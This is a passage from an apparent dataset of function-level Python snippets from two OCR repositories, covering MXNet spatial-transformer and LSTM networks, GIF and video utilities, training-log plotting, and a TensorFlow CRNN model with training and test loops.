    (loc, size_params) = LocalizationNetwork.get_network(data, source_shape, num_timesteps, num_rnn_layers=num_rnn_layers, blstm=blstm)
    concat_data = mx.symbol.Concat(*[data for _ in range(num_timesteps)], dim=0, name='concat_input_for_stn')
    transformed = mx.symbol.SpatialTransformer(data=concat_data, loc=loc, target_shape=(target_shape.height, target_shape.width), transform_type='affine', sampler_type='bilinear', name='stn')
    if fix_loc:
        transformed = mx.symbol.BlockGrad(transformed)
    h = mx.symbol.Convolution(data=transformed, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv0')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_1')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_2')
    h_conv_1 = h + pre_res_net
    h = mx.symbol.Convolution(data=h_conv_1, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_3')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_conv_1, kernel=(1, 1), num_filter=64)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2, name='rec_bn_4')
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, pool_type='max', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_5')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_2')
    h_pre_short_3 = mx.symbol.Convolution(h_conv_2, kernel=(1, 1), num_filter=128)
    h_pre_short_3 = mx.symbol.BatchNorm(data=h_pre_short_3, name='rec_bn_7')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_6')
    h = h + h_pre_short_3
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(5, 5))
    flat_h = mx.symbol.Flatten(data=h)
    h = mx.symbol.FullyConnected(data=flat_h, num_hidden=256, name='rec_fn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    classifiers = []
    for i in range(num_labels):
        softmax = mx.symbol.FullyConnected(data=h, num_hidden=52, name='rec_softmax_{}'.format(i))
        softmax = mx.symbol.Reshape(softmax, shape=(num_timesteps, -1, 52))
        softmax = mx.symbol.expand_dims(softmax, axis=1)
        classifiers.append(softmax)
    h = mx.symbol.Concat(*classifiers, dim=1, name='concat_softmax_output')
    h = mx.symbol.Reshape(h, shape=(-1, 52))
    stored_label = mx.symbol.Variable('softmax_label')
    label = mx.symbol.SwapAxis(data=stored_label, dim1=1, dim2=0)
    flat_label = mx.symbol.Reshape(data=label, shape=(-1,))
    lenet = mx.symbol.SoftmaxOutput(data=h, label=flat_label, name='softmax')
    return (lenet, loc, transformed, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(source_shape, target_shape, num_timesteps, num_rnn_layers, num_labels, blstm=False, fix_loc=False):
    data = mx.symbol.Variable('data')
    (loc, size_params) = LocalizationNetwork.get_network(data, source_shape, num_timesteps, num_rnn_layers=num_rnn_layers - 1, blstm=blstm)
    concat_data = mx.symbol.Concat(*[data for _ in range(num_timesteps)], dim=0, name='concat_input_for_stn')
    transformed = mx.symbol.SpatialTransformer(data=concat_data, loc=loc, target_shape=(target_shape.height, target_shape.width), transform_type='affine', sampler_type='bilinear', name='stn')
    if fix_loc:
        transformed = mx.symbol.BlockGrad(transformed)
    h = mx.symbol.Convolution(data=transformed, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv0')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_1')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_2')
    h_conv_1 = h + pre_res_net
    h = mx.symbol.Convolution(data=h_conv_1, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_3')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_conv_1, kernel=(1, 1), num_filter=64)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2, name='rec_bn_4')
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, pool_type='max', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_5')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_2')
    h_pre_short_3 = mx.symbol.Convolution(h_conv_2, kernel=(1, 1), num_filter=128)
    h_pre_short_3 = mx.symbol.BatchNorm(data=h_pre_short_3, name='rec_bn_7')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_6')
    h = h + h_pre_short_3
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(5, 5))
    flat_h = mx.symbol.Flatten(data=h)
    h = mx.symbol.FullyConnected(data=flat_h, num_hidden=256, name='rec_fn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Reshape(h, shape=(num_timesteps, -1, 256))
    rnn = lstm_unroll(h, layer_id=num_rnn_layers - 1, seq_len=num_timesteps, num_hidden=256, blstm=blstm)
    rnn = mx.symbol.Reshape(rnn, shape=(-1, 256))
    softmax = mx.symbol.FullyConnected(data=rnn, num_hidden=52, name='rec_softmax')
    stored_label = mx.symbol.Variable('softmax_label')
    flat_label = mx.symbol.Reshape(data=stored_label, shape=(-1,))
    flat_label = mx.symbol.Cast(data=flat_label, dtype='int32')
    loss = mx.symbol.WarpCTC(data=softmax, label=flat_label, label_length=num_labels, input_length=num_timesteps)
    return (loss, loc, transformed, size_params)"
Bartzi/stn-ocr,forward,"def forward(self, is_train, req, in_data, out_data, aux):
    x = in_data[0].asnumpy()
    nan = np.isnan(x)
    num_nan = nan[nan == True]
    logging.log(logging.DEBUG, 'Forward: max: {}, mean: {}, min: {}, nan: {}'.format(x.max(), x.mean(), x.min(), len(num_nan) / len(x.flatten())))
    self.assign(out_data[0], req[0], in_data[0])"
Bartzi/stn-ocr,backward,"def backward(self, req, out_grad, in_data, out_data, in_grad, aux):
    grad = in_grad[0].asnumpy()
    nan = np.isnan(grad)
    num_nan = nan[nan == True]
    logging.log(logging.DEBUG, 'Backward: min: {}, mean: {}, max: {} nan: {}'.format(grad.min(), grad.mean(), grad.max(), len(num_nan) / len(grad.flatten())))
    self.assign(in_grad[0], req[0], out_grad[0])"
Bartzi/stn-ocr,__init__,"def __init__(self):
    super(DebugProp, self).__init__(need_top_grad=True)"
Bartzi/stn-ocr,list_arguments,"def list_arguments(self):
    return ['data']"
Bartzi/stn-ocr,list_outputs,"def list_outputs(self):
    return ['output']"
Bartzi/stn-ocr,create_operator,"def create_operator(self, ctx, shapes, dtypes):
    return Debug()"
Bartzi/stn-ocr,forward,"def forward(self, is_train, req, in_data, out_data, aux):
    out = in_data[0].copy().asnumpy().reshape(-1, 2, 3)
    out[:, 0, 1] = 0
    out[:, 1, 0] = 0
    self.assign(out_data[0], req[0], mx.nd.array(out.reshape(-1, 6)))"
Bartzi/stn-ocr,backward,"def backward(self, req, out_grad, in_data, out_data, in_grad, aux):
    grad = out_grad[0].asnumpy().reshape(-1, 2, 3)
    grad[:, 0, 1] = 0
    grad[:, 1, 0] = 0
    self.assign(in_grad[0], req[0], mx.nd.array(grad.reshape(-1, 6)))"
Bartzi/stn-ocr,__init__,"def __init__(self):
    super(DisableShearingProp, self).__init__(need_top_grad=True)"
Bartzi/stn-ocr,list_arguments,"def list_arguments(self):
    return ['data']"
Bartzi/stn-ocr,list_outputs,"def list_outputs(self):
    return ['output']"
Bartzi/stn-ocr,infer_shape,"def infer_shape(self, in_shape):
    return ([in_shape[0]], [in_shape[0]], [])"
Bartzi/stn-ocr,create_operator,"def create_operator(self, ctx, shapes, dtypes):
    return DisableShearing()"
Bartzi/stn-ocr,forward,"def forward(self, is_train, req, in_data, out_data, aux):
    self.assign(out_data[0], req[0], mx.nd.ones(in_data[0].shape))"
Bartzi/stn-ocr,backward,"def backward(self, req, out_grad, in_data, out_data, in_grad, aux):
    self.assign(in_grad[0], req[0], mx.nd.zeros(out_grad[0].shape))"
Bartzi/stn-ocr,__init__,"def __init__(self):
    super(ProvideOnesProp, self).__init__(need_top_grad=True)"
Bartzi/stn-ocr,list_arguments,"def list_arguments(self):
    return ['data']"
Bartzi/stn-ocr,list_outputs,"def list_outputs(self):
    return ['output']"
Bartzi/stn-ocr,infer_shape,"def infer_shape(self, in_shape):
    return ([in_shape[0]], [in_shape[0]], [])"
Bartzi/stn-ocr,create_operator,"def create_operator(self, ctx, shapes, dtypes):
    return ProvideOnes()"
Bartzi/stn-ocr,lstm,"def lstm(num_hidden, indata, prev_state, param, seqidx, layeridx, prefix='forward'):
    """"""LSTM Cell symbol""""""
    i2h = mx.sym.FullyConnected(data=indata, weight=param.i2h_weight, bias=param.i2h_bias, num_hidden=num_hidden * 4, name='{prefix}t{seq_id}_l{l_id}_i2h'.format(prefix=prefix, seq_id=seqidx, l_id=layeridx))
    h2h = mx.sym.FullyConnected(data=prev_state.h, weight=param.h2h_weight, bias=param.h2h_bias, num_hidden=num_hidden * 4, name='{prefix}t{seq_id}_l{l_id}_h2h'.format(prefix=prefix, seq_id=seqidx, l_id=layeridx))
    gates = i2h + h2h
    slice_gates = mx.sym.SliceChannel(gates, num_outputs=4, name='{prefix}t{seq_id}_l{l_id}_slice'.format(prefix=prefix, seq_id=seqidx, l_id=layeridx))
    in_gate = mx.sym.Activation(slice_gates[0], act_type='sigmoid')
    in_transform = mx.sym.Activation(slice_gates[1], act_type='tanh')
    forget_gate = mx.sym.Activation(slice_gates[2], act_type='sigmoid')
    out_gate = mx.sym.Activation(slice_gates[3], act_type='sigmoid')
    next_c = forget_gate * prev_state.c + in_gate * in_transform
    next_h = out_gate * mx.sym.Activation(next_c, act_type='tanh')
    return LSTMState(c=next_c, h=next_h)"
Bartzi/stn-ocr,lstm_unroll,"def lstm_unroll(data, layer_id, seq_len=1, num_hidden=256, blstm=False, slice_axis=0, perform_extra_step=False):
    forward_cell = LSTMParam(i2h_weight=mx.sym.Variable('l%d_forward_i2h_weight' % layer_id), i2h_bias=mx.sym.Variable('l%d_forward_i2h_bias' % layer_id), h2h_weight=mx.sym.Variable('l%d_forward_h2h_weight' % layer_id), h2h_bias=mx.sym.Variable('l%d_forward_h2h_bias' % layer_id))
    forward_state = LSTMState(c=mx.sym.Reshape(mx.sym.BlockGrad(mx.sym.Variable('l%d_forward_init_c_state_cell' % layer_id)), shape=(-3, -1)), h=mx.sym.Reshape(mx.sym.BlockGrad(mx.sym.Variable('l%d_forward_init_h_state' % layer_id)), shape=(-3, -1)))
    if blstm:
        backward_cell = LSTMParam(i2h_weight=mx.sym.Variable('l%d_backward_i2h_weight' % layer_id), i2h_bias=mx.sym.Variable('l%d_backward_i2h_bias' % layer_id), h2h_weight=mx.sym.Variable('l%d_backward_h2h_weight' % layer_id), h2h_bias=mx.sym.Variable('l%d_backward_h2h_bias' % layer_id))
        backward_state = LSTMState(c=mx.sym.Reshape(mx.sym.BlockGrad(mx.sym.Variable('l%d_backward_init_c_state_cell' % layer_id)), shape=(-3, -1)), h=mx.sym.Reshape(mx.sym.BlockGrad(mx.sym.Variable('l%d_backward_init_h_state' % layer_id)), shape=(-3, -1)))
    sliced = mx.symbol.SliceChannel(data=data, num_outputs=seq_len, axis=slice_axis, squeeze_axis=True, name='slice_layer_{}'.format(layer_id))
    forward_hidden = []
    for seqidx in range(seq_len):
        indata = sliced[seqidx]
        next_state = lstm(num_hidden, indata=indata, prev_state=forward_state, param=forward_cell, seqidx=seqidx, layeridx=layer_id, prefix='forward')
        hidden = next_state.h
        forward_state = next_state
        forward_hidden.append(hidden)
        if perform_extra_step:
            next_state = lstm(num_hidden, indata=indata, prev_state=forward_state, param=forward_cell, seqidx=seq_len + seqidx, layeridx=layer_id, prefix='forward')
            hidden = next_state.h
            forward_state = next_state
            forward_hidden.append(hidden)
    if blstm:
        backward_hidden = []
        for seqidx in reversed(range(seq_len)):
            hidden = sliced[seqidx]
            next_state = lstm(num_hidden, indata=hidden, prev_state=backward_state, param=backward_cell, seqidx=seqidx, layeridx=layer_id, prefix='backward')
            hidden = next_state.h
            backward_state = next_state
            backward_hidden.append(hidden)
            if perform_extra_step:
                next_state = lstm(num_hidden, indata=hidden, prev_state=backward_state, param=backward_cell, seqidx=seq_len + seqidx, layeridx=layer_id, prefix='backward')
                hidden = next_state.h
                backward_state = next_state
                backward_hidden.append(hidden)
        backward_hidden = reversed(backward_hidden)
        layer_hidden = [mx.symbol.Concat(*[forward, backward], dim=1) for (forward, backward) in zip(forward_hidden, backward_hidden)]
    else:
        layer_hidden = forward_hidden
    hidden_concat = mx.sym.Concat(*[mx.symbol.expand_dims(hidden, axis=0) for hidden in layer_hidden], dim=0)
    if blstm:
        hidden_reshaped = mx.symbol.Reshape(data=hidden_concat, shape=(-1, num_hidden * 2))
        output_activations = mx.symbol.FullyConnected(data=hidden_reshaped, num_hidden=num_hidden, name='lstm_{}_output'.format(layer_id))
        return mx.symbol.Reshape(data=output_activations, shape=(seq_len, -1, num_hidden))
    return hidden_concat"
Bartzi/stn-ocr,meshgrid,"def meshgrid(out_size):
    (x, y) = np.meshgrid(np.linspace(-1, 1, out_size.width), np.linspace(-1, 1, out_size.height), indexing='xy')
    ones = np.ones(np.prod(x.shape))
    mesh = np.vstack((x.flatten(), y.flatten(), ones))
    return mesh"
Bartzi/stn-ocr,get_sampling_grid,"def get_sampling_grid(transform_params, output_size):
    grid = meshgrid(output_size)
    shape = transform_params.shape
    if len(shape) > 2:
        transform_params = transform_params.reshape(-1, shape[-1])
    sampling_grid = np.matmul(transform_params.reshape((len(transform_params), 2, 3)), grid)
    sampling_shape = sampling_grid.shape
    return np.reshape(sampling_grid, shape[:-1] + sampling_shape[-2:])"
Bartzi/stn-ocr,intToBin,"def intToBin(i):
    """""" Integer to two bytes """"""
    i1 = i % 256
    i2 = int(i / 256)
    return chr(i1) + chr(i2)"
Bartzi/stn-ocr,create_loop_header,"def create_loop_header(loops=0):
    if loops == 0 or loops == float('inf'):
        loops = 2 ** 16 - 1
    bb = '!ÿ\x0b'
    bb += 'NETSCAPE2.0'
    bb += '\x03\x01'
    bb += intToBin(loops)
    bb += '\x00'
    return [bb.encode('utf-8')]"
Bartzi/stn-ocr,makedelta,"def makedelta(fp, sequence):
    """"""Convert list of image frames to a GIF animation file""""""
    frames = 0
    previous = None
    for im in sequence:
        if not previous:
            loops = 2 ** 16 - 1
            for s in getheader(im, info={'loop': loops})[0] + getdata(im, duration=10, loop=2 ** 16 - 1):
                fp.write(s)
        else:
            delta = ImageChops.subtract_modulo(im, previous)
            bbox = delta.getbbox()
            if bbox:
                for s in getdata(im.crop(bbox), offset=bbox[:2], duration=10):
                    fp.write(s)
            else:
                pass
        previous = im.copy()
        frames += 1
    fp.write(b';')
    return frames"
Bartzi/stn-ocr,make_gif,"def make_gif(image_dir, dest_file, pattern='(\\d+)', image_stride=1, end=None):
    sort_pattern = re.compile(pattern)
    image_files = filter(lambda x: os.path.splitext(x)[-1] in SUPPORTED_IMAGETYPES, os.listdir(image_dir))
    images = []
    try:
        print('loading images')
        for (idx, file_name) in enumerate(image_files):
            if end and idx > end:
                break
            path = os.path.join(image_dir, file_name)
            images.append(ImageData._make((file_name, Image.open(path).convert('P'))))
        print('sorting images')
        images_sorted = sorted(images, key=lambda x: int(re.search(sort_pattern, x.file_name).group(1)))
        print('writing gif')
        with open(dest_file, 'wb') as out_file:
            makedelta(out_file, [image.image for image in images_sorted[::image_stride]])
    finally:
        for image in images:
            image.image.close()"
Bartzi/stn-ocr,get_gt_item,"def get_gt_item(gt_file, delimiter, char_map, max_len, label_length, blank_symbol):
    if label_length is None:
        label_length = max_len
    else:
        assert label_length >= max_len, 'Label length must be larger than max length'
    with open(gt_file) as the_file:
        while True:
            try:
                line = the_file.readline()
                if line == '':
                    break
                (file_path, word) = line.split(delimiter)
                file_path = file_path.strip()
                word = word.strip()
                characters = word.split(' ')
                characters = [character if character != 'SP' else ' ' for character in characters]
                if len(characters) > max_len:
                    continue
                labels = [char_map[ord(character.lower())] for character in characters]
                padding = [char_map[blank_symbol]] * (label_length - len(labels))
                labels.extend(padding)
                yield (file_path, labels)
            except (UnicodeDecodeError, ValueError, KeyError) as e:
                print(e)"
Bartzi/stn-ocr,make_video,"def make_video(image_dir, dest_file, pattern='(\\d+)'):
    sort_pattern = re.compile(pattern)
    image_files = filter(lambda x: os.path.splitext(x)[-1] in SUPPORTED_IMAGETYPES, os.listdir(image_dir))
    images = []
    print('loading images')
    for (idx, file_name) in enumerate(image_files):
        path = os.path.join(image_dir, file_name)
        images.append(ImageData(file_name=file_name, path=path))
    print('sorting images')
    images_sorted = sorted(images, key=lambda x: int(re.search(sort_pattern, x.file_name).group(1)))
    print('creating temp file')
    with tempfile.NamedTemporaryFile(mode='w') as temp_file:
        for image in images_sorted:
            print(image.path, file=temp_file)
        print('creating video')
        process_args = ['convert', '-quality 100', '@{}'.format(temp_file.name), dest_file]
        print(' '.join(process_args))
        subprocess.run(' '.join(process_args), shell=True, check=True)"
Bartzi/stn-ocr,__init__,"def __init__(self, log_file):
    self.log_file = log_file
    self.iterations_per_epoch = None
    self.train_iterations = {}
    self.test_iterations = {}"
Bartzi/stn-ocr,parse_log_file,"def parse_log_file(self, start=0, end=None):
    last_iteration = 0
    with open(self.log_file) as log_file:
        for line in log_file:
            line_splits = line.split('\t')
            if len(line_splits) == 3:
                header = line_splits[0]
                info = line_splits[2]
            elif len(line_splits) == 1:
                info = line_splits[0]
                if 'Validation' in info:
                    event_info = re.search('.*-(?P<event_name>.*)=(?P<value>.*)', info)
                    event_key = event_info.group('event_name')
                    event_value = event_info.group('value')
                    iteration_info = self.test_iterations.get(last_iteration, {})
                    iteration_info[event_key] = float(event_value)
                    self.test_iterations[last_iteration] = iteration_info
                elif 'EPOCH SIZE' in info:
                    self.iterations_per_epoch = int(info.split(':')[-1].strip())
                continue
            else:
                continue
            iteration_info = re.search('Epoch\\[(?P<epoch>\\d+)\\] Batch \\[(?P<batch>\\d+)\\]', header)
            epoch = int(iteration_info.group('epoch'))
            epoch_iteration = int(iteration_info.group('batch'))
            if self.iterations_per_epoch is None:
                raise ValueError('Iterations per epoch not found in header of log file, can not plot log')
            iteration = epoch * self.iterations_per_epoch + epoch_iteration
            if iteration < start:
                continue
            last_iteration = iteration
            event_info = re.search('.*-(?P<event_name>.*)=(?P<value>.*)', info)
            event_key = event_info.group('event_name')
            event_value = event_info.group('value')
            iteration_info = self.train_iterations.get(iteration, {})
            iteration_info[event_key] = float(event_value)
            self.train_iterations[iteration] = iteration_info
            if end is not None and iteration > end:
                break"
Bartzi/stn-ocr,smooth_values,"def smooth_values(self, values, smooth_interval=1000):
    sorted_iterations = list(sorted(values.keys()))
    smoothed_values = {}
    values_to_smooth = []
    for iteration in sorted_iterations:
        infos = values[iteration]
        if iteration % smooth_interval != 0:
            values_to_smooth.append(infos)
            continue
        accumulator = defaultdict(float)
        for value_to_smooth in values_to_smooth:
            for (metric, metric_value) in value_to_smooth.items():
                accumulator[metric] += metric_value
        for metric in accumulator.keys():
            accumulator[metric] /= len(values_to_smooth) if len(values_to_smooth) > 0 else 1
        smoothed_values[iteration] = accumulator
        values_to_smooth.clear()
    return (smoothed_values, list(sorted(smoothed_values.keys())))"
Bartzi/stn-ocr,plot,"def plot(self, start=0, end=None, smooth_values=False):
    self.parse_log_file(start=start, end=end)
    metrics_to_plot = sorted(next(iter(self.train_iterations.values())).keys(), key=lambda x: x.rsplit('_'))
    (fig, axes) = plt.subplots(len(metrics_to_plot), sharex=True)
    if smooth_values:
        (train_iterations, x_train) = self.smooth_values(self.train_iterations)
        (test_iterations, x_test) = self.smooth_values(self.test_iterations)
    else:
        x_train = list(sorted(self.train_iterations.keys()))
        x_test = list(sorted(self.test_iterations.keys()))
        train_iterations = self.train_iterations
        test_iterations = self.test_iterations
    for (metric, axe) in zip(metrics_to_plot, axes):
        axe.plot(x_train, [train_iterations[iteration][metric] for iteration in x_train], 'r.-', label='train')
        axe.plot(x_test, [test_iterations[iteration][metric] for iteration in x_test], 'g.-', label='test')
        axe.set_title(metric)
        box = axe.get_position()
        axe.set_position([box.x0, box.y0, box.width * 0.9, box.height])
        axe.legend(bbox_to_anchor=(1, 0.5), loc='center left', fancybox=True, shadow=True)
    return fig"
Bartzi/stn-ocr,split_list,"def split_list(the_list, parts):
    length = len(the_list)
    splits = [the_list[i * length // parts:(i + 1) * length // parts] for i in range(parts)]
    return splits"
Bartzi/stn-ocr,__init__,"def __init__(self, root):
    self.frame = tkinter.Frame(root)
    self.frame.pack(fill=tkinter.BOTH, expand=tkinter.YES)
    self._image = None
    self._sprite = None
    self.canvas = tkinter.Canvas(self.frame, width=850, height=400)
    self.canvas.pack(fill=tkinter.BOTH, expand=tkinter.YES)"
Bartzi/stn-ocr,image,"@property
def image(self):
    return self._image"
Bartzi/stn-ocr,image,"@image.setter
def image(self, value):
    image = ImageTk.PhotoImage(value)
    self._image = image
    self._sprite = self.canvas.create_image(value.width // 2, value.height // 2, image=self._image)
    self.canvas.config(width=value.width, height=value.height)"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.window = kwargs.pop('window')
    super(ImageDataHandler, self).__init__(*args, **kwargs)"
Bartzi/stn-ocr,handle,"def handle(self):
    data = self.rfile.read()
    data = json.loads(data.decode('utf-8'))
    width = data['width']
    height = data['height']
    data = np.fromstring(base64.b64decode(data['image']), dtype=np.uint8)
    data = np.resize(data, (height, width, 3))
    image = Image.fromarray(data, mode='RGB')
    self.window.image = image"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.window = kwargs.pop('window')
    super(ImageServer, self).__init__(*args, **kwargs)"
Bartzi/stn-ocr,finish_request,"def finish_request(self, request, client_address):
    self.RequestHandlerClass(request, client_address, self, window=self.window)"
Belval/CRNN,__init__,"def __init__(self, batch_size, model_path, examples_path, max_image_width, train_test_ratio, restore, char_set_string, use_trdg, language):
    self.step = 0
    self.CHAR_VECTOR = char_set_string
    self.NUM_CLASSES = len(self.CHAR_VECTOR) + 1
    print('CHAR_VECTOR {}'.format(self.CHAR_VECTOR))
    print('NUM_CLASSES {}'.format(self.NUM_CLASSES))
    self.model_path = model_path
    self.save_path = os.path.join(model_path, 'ckp')
    self.restore = restore
    self.training_name = str(int(time.time()))
    self.session = tf.Session()
    with self.session.as_default():
        (self.inputs, self.targets, self.seq_len, self.logits, self.decoded, self.optimizer, self.acc, self.cost, self.max_char_count, self.init) = self.crnn(max_image_width)
        self.init.run()
    with self.session.as_default():
        self.saver = tf.train.Saver(tf.global_variables(), max_to_keep=10)
        if self.restore:
            print('Restoring')
            ckpt = tf.train.latest_checkpoint(self.model_path)
            if ckpt:
                print('Checkpoint is valid')
                self.step = int(ckpt.split('-')[1])
                self.saver.restore(self.session, ckpt)
    self.data_manager = DataManager(batch_size, model_path, examples_path, max_image_width, train_test_ratio, self.max_char_count, self.CHAR_VECTOR, use_trdg, language)"
Belval/CRNN,crnn,"def crnn(self, max_width):

    def BidirectionnalRNN(inputs, seq_len):
        """"""
                Bidirectionnal LSTM Recurrent Neural Network part
            """"""
        with tf.variable_scope(None, default_name='bidirectional-rnn-1'):
            lstm_fw_cell_1 = rnn.BasicLSTMCell(256)
            lstm_bw_cell_1 = rnn.BasicLSTMCell(256)
            (inter_output, _) = tf.nn.bidirectional_dynamic_rnn(lstm_fw_cell_1, lstm_bw_cell_1, inputs, seq_len, dtype=tf.float32)
            inter_output = tf.concat(inter_output, 2)
        with tf.variable_scope(None, default_name='bidirectional-rnn-2'):
            lstm_fw_cell_2 = rnn.BasicLSTMCell(256)
            lstm_bw_cell_2 = rnn.BasicLSTMCell(256)
            (outputs, _) = tf.nn.bidirectional_dynamic_rnn(lstm_fw_cell_2, lstm_bw_cell_2, inter_output, seq_len, dtype=tf.float32)
            outputs = tf.concat(outputs, 2)
        return outputs

    def CNN(inputs):
        """"""
                Convolutionnal Neural Network part
            """"""
        conv1 = tf.layers.conv2d(inputs=inputs, filters=64, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        pool1 = tf.layers.max_pooling2d(inputs=conv1, pool_size=[2, 2], strides=2)
        conv2 = tf.layers.conv2d(inputs=pool1, filters=128, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        pool2 = tf.layers.max_pooling2d(inputs=conv2, pool_size=[2, 2], strides=2)
        conv3 = tf.layers.conv2d(inputs=pool2, filters=256, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        bnorm1 = tf.layers.batch_normalization(conv3)
        conv4 = tf.layers.conv2d(inputs=bnorm1, filters=256, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        pool3 = tf.layers.max_pooling2d(inputs=conv4, pool_size=[2, 2], strides=[1, 2], padding='same')
        conv5 = tf.layers.conv2d(inputs=pool3, filters=512, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        bnorm2 = tf.layers.batch_normalization(conv5)
        conv6 = tf.layers.conv2d(inputs=bnorm2, filters=512, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
        pool4 = tf.layers.max_pooling2d(inputs=conv6, pool_size=[2, 2], strides=[1, 2], padding='same')
        conv7 = tf.layers.conv2d(inputs=pool4, filters=512, kernel_size=(2, 2), padding='valid', activation=tf.nn.relu)
        return conv7
    batch_size = None
    inputs = tf.placeholder(tf.float32, [batch_size, max_width, 32, 1], name='input')
    targets = tf.sparse_placeholder(tf.int32, name='targets')
    seq_len = tf.placeholder(tf.int32, [None], name='seq_len')
    cnn_output = CNN(inputs)
    reshaped_cnn_output = tf.squeeze(cnn_output, [2])
    max_char_count = cnn_output.get_shape().as_list()[1]
    crnn_model = BidirectionnalRNN(reshaped_cnn_output, seq_len)
    logits = tf.reshape(crnn_model, [-1, 512])
    W = tf.Variable(tf.truncated_normal([512, self.NUM_CLASSES], stddev=0.1), name='W')
    b = tf.Variable(tf.constant(0.0, shape=[self.NUM_CLASSES]), name='b')
    logits = tf.matmul(logits, W) + b
    logits = tf.reshape(logits, [tf.shape(cnn_output)[0], max_char_count, self.NUM_CLASSES])
    logits = tf.transpose(logits, (1, 0, 2))
    loss = tf.nn.ctc_loss(targets, logits, seq_len, ignore_longer_outputs_than_inputs=True)
    cost = tf.reduce_mean(loss)
    optimizer = tf.train.AdamOptimizer(learning_rate=0.0001).minimize(cost)
    (decoded, log_prob) = tf.nn.ctc_beam_search_decoder(logits, seq_len, merge_repeated=False)
    dense_decoded = tf.sparse_tensor_to_dense(decoded[0], default_value=-1, name='dense_decoded')
    acc = tf.reduce_mean(tf.edit_distance(tf.cast(decoded[0], tf.int32), targets))
    init = tf.global_variables_initializer()
    return (inputs, targets, seq_len, logits, dense_decoded, optimizer, acc, cost, max_char_count, init)"
Belval/CRNN,train,"def train(self, iteration_count):
    with self.session.as_default():
        print('Training')
        for i in range(self.step, iteration_count + self.step):
            batch_count = 0
            iter_loss = 0
            for (batch_y, batch_dt, batch_x) in self.data_manager.train_batches:
                (op, decoded, loss_value, acc) = self.session.run([self.optimizer, self.decoded, self.cost, self.acc], feed_dict={self.inputs: batch_x, self.seq_len: [self.max_char_count] * self.data_manager.batch_size, self.targets: batch_dt})
                if i % 10 == 0:
                    for j in range(2):
                        pred = ground_truth_to_word(decoded[j], self.CHAR_VECTOR)
                        print('{} | {}'.format(batch_y[j], pred))
                    print('---- {} | {} ----'.format(i, batch_count))
                iter_loss += loss_value
                batch_count += 1
                if batch_count >= 100:
                    break
            self.saver.save(self.session, self.save_path, global_step=self.step)
            self.save_frozen_model('save/frozen.pb')
            print('[{}] Iteration loss: {} Error rate: {}'.format(self.step, iter_loss, acc))
            self.step += 1
    return None"
Belval/CRNN,test,"def test(self):
    with self.session.as_default():
        print('Testing')
        for (batch_y, _, batch_x) in self.data_manager.test_batches:
            decoded = self.session.run(self.decoded, feed_dict={self.inputs: batch_x, self.seq_len: [self.max_char_count] * self.data_manager.batch_size})
            for (i, y) in enumerate(batch_y):
                print(batch_y[i])
